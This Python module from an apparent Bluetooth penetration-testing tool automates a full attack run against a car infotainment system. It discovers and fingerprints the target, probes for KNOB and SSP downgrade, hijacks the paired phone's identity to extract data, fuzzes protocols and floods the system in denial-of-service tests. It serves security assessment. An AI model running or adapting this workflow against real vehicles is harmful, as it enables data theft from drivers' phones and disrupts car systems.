"""Automated full-spectrum Bluetooth penetration test workflow.

Executes a complete pentest methodology against a target IVI system:

  Phase 1: Discovery      — scan for nearby devices, identify phones
  Phase 2: Fingerprinting  — BT version, chipset, profiles, attack surface
  Phase 3: Reconnaissance  — SDP services, RFCOMM channels, L2CAP PSMs
  Phase 4: Vuln Assessment — 20+ CVE and configuration checks
  Phase 5: Pairing Attacks — SSP downgrade probe, KNOB probe
  Phase 6: Exploitation    — hijack (MAC spoof + data extraction)
  Phase 7: Protocol Fuzzing— coverage-guided fuzzing (configurable duration)
  Phase 8: DoS Testing     — protocol-level resilience tests
  Phase 9: Report          — HTML + JSON with all findings

Each phase logs progress to the CLI and session. Failures in one phase
do not stop subsequent phases — the workflow is resilient.
"""

import os
import time

from blue_tap.utils.bt_helpers import normalize_mac
from blue_tap.utils.output import info, success, error, warning, console, section


def _rssi_key(d):
    """Safe RSSI sort key."""
    rssi = d.get("rssi", -999)
    try:
        return int(rssi)
    except (ValueError, TypeError):
        return -999


def _phase(name: str, results: dict, func, **kwargs) -> dict | None:
    """Run a phase with error handling and timing."""
    start = time.time()
    info(f"  Starting...")
    try:
        result = func(**kwargs)
        elapsed = time.time() - start
        if isinstance(result, dict):
            result["_elapsed_seconds"] = round(elapsed, 1)
        results["phases"][name] = result or {"status": "success", "_elapsed_seconds": round(elapsed, 1)}
        success(f"  Complete ({elapsed:.1f}s)")
        return result
    except Exception as exc:
        elapsed = time.time() - start
        warning(f"  Failed ({elapsed:.1f}s): {exc}")
        results["phases"][name] = {"status": "failed", "error": str(exc), "_elapsed_seconds": round(elapsed, 1)}
        return None


class AutoPentest:
    """Full-spectrum automated Bluetooth penetration test.

    Usage:
        auto = AutoPentest("AA:BB:CC:DD:EE:FF")
        results = auto.run(output_dir="pentest_output", fuzz_duration=3600)
    """

    def __init__(self, ivi_address: str, hci: str = "hci0"):
        self.ivi_address = normalize_mac(ivi_address)
        self.hci = hci

    def discover_paired_phone(self, scan_duration: int = 30) -> dict | None:
        """Scan and identify the phone paired with the IVI."""
        from blue_tap.core.scanner import scan_classic
        from blue_tap.utils.bt_helpers import ensure_adapter_ready

        if not ensure_adapter_ready(self.hci):
            return None

        info(f"  Scanning for {scan_duration}s on {self.hci}...")
        devices = scan_classic(scan_duration, self.hci)
        if not devices:
            warning("  No devices found")
            return None

        info(f"  Found {len(devices)} device(s), identifying phones...")
        candidates = []
        for dev in devices:
            addr = dev.get("address", "")
            if addr.upper() == self.ivi_address:
                continue
            name = dev.get("name", "").lower()
            phone_keywords = ["phone", "galaxy", "iphone", "pixel", "oneplus",
                              "huawei", "xiaomi", "samsung", "oppo", "vivo",
                              "motorola", "nokia", "lg", "sony", "htc"]
            is_phone = any(kw in name for kw in phone_keywords)
            if dev.get("class_info", {}).get("is_phone"):
                is_phone = True
            if is_phone:
                candidates.append(dev)

        if candidates:
            best = max(candidates, key=_rssi_key)
            info(f"  Identified phone: {best.get('name', '?')} ({best.get('address')})")
            return best

        non_ivi = [d for d in devices if d.get("address", "").upper() != self.ivi_address]
        if non_ivi:
            best = max(non_ivi, key=_rssi_key)
            warning(f"  No phone identified, best guess: {best.get('name', '?')} ({best.get('address')})")
            return best
        return None

    def run(self, output_dir: str = "pentest_output",
            scan_duration: int = 30,
            fuzz_duration: float = 3600,
            skip_fuzz: bool = False,
            skip_dos: bool = False,
            skip_exploit: bool = False) -> dict:
        """Execute the full pentest methodology.

        Args:
            output_dir: Where to save all output files.
            scan_duration: Seconds for phone discovery scan.
            fuzz_duration: Seconds for protocol fuzzing (default: 1 hour).
            skip_fuzz: Skip the fuzzing phase.
            skip_dos: Skip the DoS testing phase.
            skip_exploit: Skip the exploitation/hijack phase.
        """
        os.makedirs(output_dir, exist_ok=True)
        results = {"target": self.ivi_address, "status": "started", "phases": {}}
        start_time = time.time()

        console.rule("[bold red]Blue-Tap Automated Pentest")
        info(f"Target: [bold]{self.ivi_address}[/bold]")
        info(f"Output: {output_dir}/")
        info(f"Fuzzing: {'skip' if skip_fuzz else f'{fuzz_duration:.0f}s ({fuzz_duration/60:.0f}m)'}")
        console.print()

        # ── Phase 1: Discovery ──────────────────────────────────────
        section("Phase 1: Device Discovery", style="bt.cyan")
        phone = _phase("discovery", results, self.discover_paired_phone,
                        scan_duration=scan_duration)
        phone_addr = phone.get("address", "") if phone else ""
        phone_name = phone.get("name", "") if phone else ""
        if phone:
            results["phases"]["discovery"]["phone_address"] = phone_addr
            results["phases"]["discovery"]["phone_name"] = phone_name

        # ── Phase 2: Fingerprinting ─────────────────────────────────
        section("Phase 2: Device Fingerprinting", style="bt.cyan")

        def _fingerprint():
            from blue_tap.recon.fingerprint import fingerprint_device
            fp = fingerprint_device(self.ivi_address)
            info(f"  Manufacturer: {fp.get('manufacturer', '?')}")
            info(f"  BT Version: {fp.get('bt_version', '?')}")
            info(f"  Profiles: {len(fp.get('profiles', []))}")
            info(f"  Attack surface: {', '.join(fp.get('attack_surface', []))}")
            if fp.get("vuln_hints"):
                for hint in fp["vuln_hints"]:
                    warning(f"  Indicator: {hint}")
            return {"status": "success", "fingerprint": fp}

        _phase("fingerprint", results, _fingerprint)

        # ── Phase 3: Reconnaissance ─────────────────────────────────
        section("Phase 3: Service Reconnaissance", style="bt.cyan")

        def _recon():
            from blue_tap.recon.sdp import browse_services
            from blue_tap.recon.rfcomm_scan import RFCOMMScanner
            from blue_tap.recon.l2cap_scan import L2CAPScanner

            info("  Browsing SDP services...")
            services = browse_services(self.ivi_address)
            info(f"  Found {len(services)} SDP service(s)")
            for svc in services:
                profile = svc.get("profile", "")
                if any(kw in profile for kw in ["PBAP", "MAP", "HFP", "A2DP", "SPP"]):
                    info(f"    Attack surface: {svc.get('name')} -> {profile} (ch={svc.get('channel')})")

            info("  Scanning RFCOMM channels 1-30...")
            rfcomm = RFCOMMScanner(self.ivi_address)
            rfcomm_results = rfcomm.scan_all_channels(timeout_per_ch=2)
            open_rfcomm = [r for r in rfcomm_results if r["status"] == "open"]
            info(f"  RFCOMM: {len(open_rfcomm)} open channel(s)")

            info("  Scanning L2CAP PSMs...")
            l2cap = L2CAPScanner(self.ivi_address)
            l2cap_results = l2cap.scan_standard_psms(timeout=1)
            open_l2cap = [r for r in l2cap_results if r["status"] in ("open", "auth_required")]
            info(f"  L2CAP: {len(open_l2cap)} open PSM(s)")

            return {
                "status": "success",
                "sdp_services": len(services),
                "rfcomm_open": len(open_rfcomm),
                "l2cap_open": len(open_l2cap),
                "services": services,
            }

        _phase("recon", results, _recon)

        # ── Phase 4: Vulnerability Assessment ───────────────────────
        section("Phase 4: Vulnerability Assessment", style="bt.yellow")

        def _vulnscan():
            from blue_tap.attack.vuln_scanner import scan_vulnerabilities
            findings = scan_vulnerabilities(self.ivi_address, self.hci)
            confirmed = sum(1 for f in findings if f.get("status") == "confirmed")
            critical = sum(1 for f in findings if f.get("severity", "").upper() == "CRITICAL")
            high = sum(1 for f in findings if f.get("severity", "").upper() == "HIGH")
            info(f"  {len(findings)} finding(s): {confirmed} confirmed, {critical} CRITICAL, {high} HIGH")
            return {"status": "success", "findings": findings, "count": len(findings)}

        vuln_result = _phase("vuln_assessment", results, _vulnscan)
        findings = vuln_result.get("findings", []) if vuln_result else []

        # ── Phase 5: Pairing & Encryption Attacks ───────────────────
        section("Phase 5: Pairing & Encryption Attacks", style="bt.yellow")

        def _pairing_attacks():
            attack_results = {}

            # SSP Downgrade probe
            info("  Probing SSP downgrade vulnerability...")
            try:
                from blue_tap.attack.ssp_downgrade import SSPDowngradeAttack
                ssp = SSPDowngradeAttack(self.ivi_address, hci=self.hci)
                ssp_result = ssp.probe()
                if ssp_result.get("legacy_fallback_possible"):
                    warning("  SSP downgrade: VULNERABLE — legacy PIN fallback possible")
                else:
                    info("  SSP downgrade: not vulnerable")
                attack_results["ssp_probe"] = ssp_result
            except Exception as exc:
                info(f"  SSP probe skipped: {exc}")

            # KNOB probe
            info("  Probing KNOB vulnerability (CVE-2019-9506)...")
            try:
                from blue_tap.attack.knob import KNOBAttack
                knob = KNOBAttack(self.ivi_address, hci=self.hci)
                knob_result = knob.probe()
                if knob_result.get("likely_vulnerable"):
                    warning("  KNOB: LIKELY VULNERABLE — key negotiation may be downgradeable")
                else:
                    info("  KNOB: not vulnerable")
                attack_results["knob_probe"] = knob_result
            except Exception as exc:
                info(f"  KNOB probe skipped: {exc}")

            return {"status": "success", "attacks": attack_results}

        _phase("pairing_attacks", results, _pairing_attacks)

        # ── Phase 6: Exploitation ───────────────────────────────────
        if not skip_exploit and phone_addr:
            section("Phase 6: Exploitation (Hijack + Data Extraction)", style="bt.red")

            def _exploit():
                from blue_tap.attack.hijack import HijackSession
                info(f"  Impersonating {phone_name or phone_addr}...")
                session = HijackSession(
                    ivi_address=self.ivi_address,
                    phone_address=phone_addr,
                    phone_name=phone_name,
                    hci=self.hci,
                    output_dir=output_dir,
                )
                try:
                    attack_results = session.run_full_attack()
                    return attack_results
                finally:
                    session.cleanup()

            _phase("exploitation", results, _exploit)
        else:
            info("Phase 6: Exploitation skipped" +
                 (" (no phone discovered)" if not phone_addr else " (--skip-exploit)"))

        # ── Phase 7: Protocol Fuzzing ───────────────────────────────
        if not skip_fuzz:
            section("Phase 7: Protocol Fuzzing", style="bt.red")

            def _fuzz():
                from blue_tap.fuzz.engine import FuzzCampaign
                fuzz_dir = os.path.join(output_dir, "fuzz")

                # Coverage-guided strategy: learns from responses, adapts mutations,
                # tracks protocol states, detects anomalies. Best strategy for
                # automated assessments — maximizes code path exploration.
                info(f"  Strategy: coverage-guided (response-diversity feedback)")
                info(f"  Protocols: sdp, rfcomm, l2cap, ble-att")
                info(f"  Duration: {fuzz_duration:.0f}s ({fuzz_duration/60:.0f} minutes)")

                campaign = FuzzCampaign(
                    target=self.ivi_address,
                    protocols=["sdp", "rfcomm", "l2cap", "ble-att"],
                    strategy="coverage_guided",
                    duration=fuzz_duration,
                    session_dir=os.path.dirname(fuzz_dir) or ".",
                )
                summary = campaign.run()

                crashes = summary.get("crashes", 0)
                packets = summary.get("packets_sent", 0)
                info(f"  Sent {packets:,} test cases, found {crashes} crash(es)")
                if crashes > 0:
                    warning(f"  {crashes} crash(es) detected — review with: blue-tap fuzz crashes list")

                return summary

            _phase("fuzzing", results, _fuzz)
        else:
            info("Phase 7: Protocol fuzzing skipped (--skip-fuzz)")

        # ── Phase 8: DoS Testing ────────────────────────────────────
        if not skip_dos:
            section("Phase 8: Denial of Service Testing", style="bt.yellow")

            def _dos():
                dos_results = []

                tests = [
                    ("L2CAP connection storm", "l2cap_connection_storm",
                     lambda: __import__("blue_tap.attack.protocol_dos", fromlist=["L2CAPDoS"]).L2CAPDoS(self.ivi_address).config_option_bomb(rounds=50)),
                    ("L2CAP CID exhaustion", "cid_exhaustion",
                     lambda: __import__("blue_tap.attack.protocol_dos", fromlist=["L2CAPDoS"]).L2CAPDoS(self.ivi_address).cid_exhaustion(count=100)),
                    ("SDP continuation exhaustion", "sdp_continuation",
                     lambda: __import__("blue_tap.attack.protocol_dos", fromlist=["SDPDoS"]).SDPDoS(self.ivi_address).continuation_exhaustion(connections=5)),
                    ("RFCOMM SABM flood", "rfcomm_sabm",
                     lambda: __import__("blue_tap.attack.protocol_dos", fromlist=["RFCOMMDoS"]).RFCOMMDoS(self.ivi_address).sabm_flood(count=30)),
                    ("HFP AT command flood", "hfp_at_flood",
                     lambda: __import__("blue_tap.attack.protocol_dos", fromlist=["HFPDoS"]).HFPDoS(self.ivi_address).at_command_flood(count=1000)),
                ]

                unresponsive = 0
                for name, key, func in tests:
                    info(f"  Running: {name}...")
                    try:
                        result = func()
                        status = result.get("result", "unknown")
                        if status == "target_unresponsive":
                            warning(f"    Target became UNRESPONSIVE")
                            unresponsive += 1
                        else:
                            info(f"    Result: {status}")
                        dos_results.append(result)
                    except Exception as exc:
                        info(f"    Skipped: {exc}")
                    # Brief recovery between tests
                    time.sleep(3)

                info(f"  {len(dos_results)} test(s) run, {unresponsive} caused unresponsiveness")
                return {
                    "status": "success",
                    "tests_run": len(dos_results),
                    "unresponsive_count": unresponsive,
                    "results": dos_results,
                }

            _phase("dos_testing", results, _dos)
        else:
            info("Phase 8: DoS testing skipped (--skip-dos)")

        # ── Phase 9: Report Generation ──────────────────────────────
        section("Phase 9: Report Generation", style="bt.green")

        def _report():
            from blue_tap.report.generator import ReportGenerator
            report = ReportGenerator()

            # Feed all collected data
            report.load_from_directory(output_dir)
            if findings:
                report.add_vuln_findings(findings)
            if phone:
                report.add_scan_results([phone])

            # Feed phase results into attack_results
            attack_data = {}
            for phase_name in ("pairing_attacks", "exploitation"):
                phase_data = results["phases"].get(phase_name, {})
                if isinstance(phase_data, dict):
                    attack_data[phase_name] = phase_data
            if attack_data:
                report.add_attack_results(attack_data)

            # Feed DoS results
            dos_phase = results["phases"].get("dos_testing", {})
            if isinstance(dos_phase, dict):
                for dos_result in dos_phase.get("results", []):
                    report.add_dos_results({"data": dos_result})

            # Session metadata
            report.add_session_metadata({
                "name": f"auto-{self.ivi_address.replace(':', '')}",
                "created": time.strftime("%Y-%m-%dT%H:%M:%S"),
                "last_updated": time.strftime("%Y-%m-%dT%H:%M:%S"),
                "targets": [self.ivi_address],
                "commands": [
                    {"command": phase, "category": "auto", "target": self.ivi_address,
                     "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S")}
                    for phase in results["phases"]
                ],
            })

            html_path = os.path.join(output_dir, "report.html")
            json_path = os.path.join(output_dir, "report.json")
            report.generate_html(html_path)
            report.generate_json(json_path)
            info(f"  HTML: {html_path}")
            info(f"  JSON: {json_path}")
            return {"status": "success", "html": html_path, "json": json_path}

        _phase("report", results, _report)

        # ── Summary ─────────────────────────────────────────────────
        total_time = time.time() - start_time
        results["total_time_seconds"] = round(total_time, 1)

        passed = sum(1 for p in results["phases"].values()
                     if isinstance(p, dict) and p.get("status") != "failed")
        failed = sum(1 for p in results["phases"].values()
                     if isinstance(p, dict) and p.get("status") == "failed")
        total = len(results["phases"])

        if failed == 0:
            results["status"] = "complete"
            color = "green"
        elif passed > 0:
            results["status"] = "partial"
            color = "yellow"
        else:
            results["status"] = "failed"
            color = "red"

        console.print()
        console.rule(f"[bold {color}]Pentest {results['status'].title()} "
                     f"({passed}/{total} phases, {total_time/60:.1f} minutes)")

        return results


# Backward compatibility alias
class AutoDiscovery(AutoPentest):
    """Legacy alias for AutoPentest."""

    def run_auto(self, output_dir: str = "auto_output",
                 scan_duration: int = 30) -> dict:
        return self.run(output_dir=output_dir, scan_duration=scan_duration,
                        fuzz_duration=3600)
